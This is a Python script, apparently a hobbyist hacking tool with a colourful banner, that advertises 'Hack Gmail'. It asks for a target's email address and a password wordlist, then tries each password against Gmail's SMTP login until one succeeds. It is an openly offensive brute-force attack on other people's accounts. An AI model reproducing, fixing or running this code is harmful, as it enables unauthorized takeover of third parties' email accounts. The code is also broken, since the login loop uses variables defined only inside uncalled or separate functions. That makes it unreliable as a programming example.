import smtplib

smtpserver = smtplib.SMTP("smtp.gmail.com", 587)
smtpserver.ehlo()
smtpserver.starttls()
print("\033[1;91m     ___  ___       ___   _____   _____    _  __    __       _____  __    __ ")
print("\033[1;91m    /   |/   |     /   | |_   _| |  _  \  | | \ \  / /      /  _  \ \ \  / / ")
print("\033[1;91m   / /|   /| |    / /| |   | |   | |_| |  | |  \ \/ /       | |_| |  \ \/ /  ")
print("\033[1;91m  / / |__/ | |   / / | |   | |   |  _  /  | |   }  {        }  _  {   }  {   ")
print("\033[1;91m / /       | |  / /  | |   | |   | | \ \  | |  / /\ \       | |_| |  / /\ \  ")
print("\033[1;91m/_/        |_| /_/   |_|   |_|   |_|  \_\ |_| /_/  \_\      \_____/ /_/  \_\ ")
print("\033[0;32m                    =========>> By Badrddin Mermouchi")
print("\033[1;91m Facebook ==>> https://www.facebook.com/cori.justin.1/")
print("                                                         ")
print("\033[01;32m[01] \033[01;34mHack Gmail")
def badr():
    user = input("\033[01;33m[+] Email That you want to hack ===> :")
    passwfile = input("\033[01;33m[+] 1\033[01;34mSelect a password list :")
    passwfile = open(passwfile, "r")
number = input("\033[01;32mTybe Your Number Please .... :")
if number ==("1"):
   print("\033[1;91m        ,     , ")
   print("\033[1;91m      (\____/) ")
   print("\033[1;91m       (_oo_) ")
   print("\033[1;91m         (O) ")
   print("\033[1;91m       __||__    \) ")
   print("\033[1;91m   []/______\[] /")
   print("\033[1;91m   / \______/ \/")
   print("\033[1;91m  /    /__\ ")
   print("\033[1;91m  (\   /____\ ")
   badr()
else:
    print("\033[01;33m===> Error The Number <===")
    print("\033[01;33m[*] \033[01;34mTybe Number '1' Please ....!")
    Number= input("\033[01;34m[+] \033[01;33mTybe The Namber :")
    if Number ==("1"):
        print("\033[01;33m .... \033[01;34mWillcom To My Programmer \033[01;33m 0....")
        
        badr()
    else:
        print("Error")
def pidro():
    user = input("\033[01;33m[+] Email That you want to hack ===> :")
    passwfile = input("\033[01;33m[+] 1\033[01;34mSelect a password list :")
    passwfile = open(passwfile, "r")

for password in passwfile:
    try:
        smtpserver.login(user, password)
        print("\033[01;34m[+]password fond \033[01;33m==>  ")
        break;

    except smtplib.SMTPAuthenticationError:
        print("\033[01;33m[!]password not fond \033[01;34m===>   ")
